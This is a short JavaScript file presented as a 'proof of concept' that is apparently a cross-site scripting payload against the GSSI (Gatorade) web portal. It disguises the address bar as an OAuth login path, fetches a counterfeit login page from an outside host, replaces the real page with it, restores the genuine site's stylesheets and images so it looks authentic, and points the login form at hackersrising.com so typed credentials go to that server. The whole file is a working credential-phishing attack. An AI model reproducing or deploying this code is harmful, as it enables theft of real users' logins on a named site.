// fakelogin.js - Clean full-page fake login PoC

(function() {
    'use strict';

    // Make URL look real
    history.replaceState(null, 'GSSI Universal Login - Gatorade Performance Partner', '/gpapi/oauth/login');

    fetch('https://cdn.jsdelivr.net/gh/TheeEclipse/xss/login.html')   // ← change to your actual raw URL
        .then(r => r.text())
        .then(html => {
            // Replace entire page
            document.documentElement.innerHTML = html;

            // Fix all relative paths to absolute real domain paths
            setTimeout(fixResources, 300);
        })
        .catch(err => console.error('Failed to load fake login:', err));
})();

// Function to fix broken relative links
function fixResources() {
    const base = 'https://www.gssiweb.org/GPAPI/dist/lib/';

    // Fix all <link> CSS
    document.querySelectorAll('link[rel="stylesheet"]').forEach(link => {
        let href = link.getAttribute('href');
        if (href && !href.startsWith('http')) {
            // Convert relative paths to real ones
            if (href.includes('bootstrap.min.css')) {
                link.href = base + 'bootstrap.min.css';
            } else if (href.includes('VanillaSelectBox.css')) {
                link.href = base + 'VanillaSelectBox.css';
            } else if (href.includes('main.css')) {
                link.href = base + 'main.css';           // adjust if exact filename differs
            } else {
                link.href = base + href.split('/').pop(); // fallback
            }
        }
    });

    // Fix all <script> src (except the ones we want to keep)
    document.querySelectorAll('script[src]').forEach(script => {
        let src = script.getAttribute('src');
        if (src && !src.startsWith('http') && !src.includes('hackersrising.com')) {
            script.src = base + src.split('/').pop();
        }
    });

    // Fix images if any (example for the cookie icon)
    document.querySelectorAll('img').forEach(img => {
        let src = img.getAttribute('src');
        if (src && !src.startsWith('http')) {
            img.src = 'https://www.gssiweb.org/GPAPI/dist/lib/' + src.split('/').pop();
        }
    });

    // Force the form action again (safety)
    const form = document.getElementById('DietaryLogin');
    if (form) {
        form.action = 'https://hackersrising.com/GPAPI/oauth/login';
    }

    console.log('%c[PoC] Fake login page loaded with fixed resources', 'color: red; font-weight: bold');
}
